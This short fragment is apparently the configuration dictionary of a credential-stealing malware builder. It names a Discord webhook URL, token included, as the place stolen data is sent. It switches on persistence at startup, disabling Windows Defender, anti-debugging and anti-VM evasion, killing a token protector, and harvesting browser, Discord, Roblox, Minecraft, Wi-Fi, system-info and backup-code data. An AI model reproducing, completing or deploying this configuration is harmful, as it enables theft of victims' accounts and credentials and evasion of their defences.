...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1066675189812834304/X_EvLvIsswUF35s91CCsc-G7_f_kPtLYZjgHMThk6zbjl7mNMNzpc2jRQfdSkzfx73hU', 'ping': True, 'pingtype': 'Everyone', 'error': True, 'startup': True, 'defender': True, 'systeminfo': True, 'backupcodes': True, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': True, 'minecraft': True, 'wifi': True, 'killprotector': True, 'antidebug_vm': True, 'discord': True}
